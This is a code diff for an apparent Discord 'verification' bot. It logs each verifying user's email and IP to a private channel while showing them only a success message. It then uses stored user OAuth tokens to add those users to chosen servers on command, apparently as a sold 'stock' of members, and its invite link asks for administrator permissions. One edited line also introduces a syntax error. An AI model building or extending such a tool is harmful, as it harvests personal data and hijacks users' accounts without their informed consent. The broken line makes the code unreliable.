@@ -289,13 +289,13 @@ app.get('/', async (req, res) => {
             }
         }
 
+        // Clean user-facing success page (NO email or IP shown here, only sent to logs channel)
         return res.send(`
             <html>
                 <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                     <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                         <h2 style="color:#55ff55;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Successful</h2>
                         <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Your account has been verified successfully. You can now close this window and return to Discord.</p>
-                        <p style="color:#8f96a0;font-size:13px;margin-top:20px;">Email: ${userEmail} | IP: ${clientIp}</p>
                     </div>
                 </body>
             </html>
@@ -562,11 +562,13 @@ client.on('messageCreate', async message => {
         return message.channel.send({ embeds: [helpEmbed] });
     }
 
+    // --- Fixed: ,bot command now sends the correct Add Bot button cleanly ---
     if (command === 'bot' || command === 'invite') {
         if (message.author.id !== OWNER_ID) return;
         const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1564997108908556369&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app%2F&integration_type=0&scope=bot+guilds';
+        const botEmbed = new EmbedBuilder().setTitle('Add Bot').setDescription('Click the button below to add the bot to your server.').setColor(EMBED_COLOR);
         const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(inviteUrl));
-        return WEBHOOKS.ADD_BOT.send({ components: [row] });
+        return message.channel.send({ embeds: [botEmbed], components: [row] });
     }
 
     if (command === 'stock') {
@@ -720,7 +722,7 @@ client.on('messageCreate', async message => {
             .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
             .setColor(EMBED_COLOR);
         
-        await WEBHOOKS.EXECUTION.send({ embeds: [addingEmbed] });
+        await WEBHOOKS.EXECUTION.send({ embeds: [addingEmbed]}`);
 
         let successCount = 0;
         for (const tokenData of tokensToUse) {
